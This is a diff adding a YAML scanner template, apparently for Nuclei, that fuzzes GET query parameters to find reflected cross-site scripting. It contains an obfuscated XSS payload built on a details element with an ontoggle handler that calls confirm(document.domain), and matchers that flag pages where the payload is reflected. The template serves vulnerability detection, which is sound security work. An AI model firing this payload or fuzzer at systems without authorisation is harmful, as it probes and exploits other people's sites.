@@ -1,0 +1,40 @@
+id: fuzz-reflection-xss-custom-2
+
+info:
+  name: Custom Reflection Potential XSS Detection for details element
+  author: netbaan
+  severity: low
+  description: |
+    This template is designed to detect reflection XSS vulnerabilities using a specified payload
+    for the `<details>` HTML element with an `onToggle` event handler.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      reflection:
+        - "<details+/\\'on+/ontoggle=1^confirm(document.domain)+open//"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
